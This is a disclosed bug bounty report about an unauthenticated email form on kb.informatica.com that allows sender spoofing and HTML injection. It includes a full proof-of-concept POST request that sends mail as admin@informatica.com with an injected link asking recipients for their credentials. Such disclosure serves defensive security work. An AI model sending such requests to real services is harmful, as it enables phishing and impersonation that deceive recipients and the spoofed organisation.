# [kb.informatica.com] Unauthenticated emails and HTML injection in email messages

## Report Details
- **Report ID**: 139402
- **URL**: https://hackerone.com/reports/139402
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2016-05-17T18:06:34.804Z
- **Disclosed**: 2016-11-28T16:35:38.925Z

## Reporter
- **Username**: strukt
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: informatica

## Vulnerability Information
Hello,

The endpoint at https://kb.informatica.com/_layouts/infa_kb/preview/EmailExtended.aspx?docid=anything is vulnerable to unauthenticated emails, which allows attackers to impersonate anyone and send emails on their behalf.

Also, the message body field is vulnerable to HTML injection, which allows the attacker to inject <a> and <img> tags in the message to make it more appealing to the victim.

The attacker is only able to use all the message parts (subject and body, and spoof the sender email) when the value of the GET parameter "docid" is invalid, following is a PoC request:

POST /_layouts/infa_kb/preview/EmailExtended.aspx?docid=test HTTP/1.1
Host: kb.informatica.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.8.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://kb.informatica.com/_layouts/infa_kb/preview/EmailExtended.aspx?docid=test
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 456

__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwUKLTEzODI5NjM1MmRkIAMIwf3AXuDHeZBC%2Bpk%2FVrqUtUo%3D&__VIEWSTATEGENERATOR=D7632FD9&__EVENTVALIDATION=%2FwEWDQKX6trHCgLs0bLrBgLs0fbZDALs0Yq1BQLs0e58AuzRgtgJAuzRxsYPAoznisYGApCjwqsNAs3nv%2BIOAsHFicAHAtPVqd4NAozmy%2BgBxyQ%2FpTxgPj3UtaL60YTEMzWLNM8%3D&TextBox1=████████&TextBox2=&TextBox3=&TextBox4=admin@informatica.com&TextBox5=A convincing subject&TextBox6=Hello, please visit <a href=http://www.example.com>Our login page</a> and enter your credentials to win a reward.&Button1=Submit

The above request will send an email to ████ from admin@informatica.com with a message that asks to open a link and enter the user's credentials, which will be really convincing for the user, especially if the attacker has already registered a domain name that looks like Informatica's legit one.

I have attached a screenshot of the mail I received from the above request to make it more clear.

Regards

## Attachments
- Selection_011.png
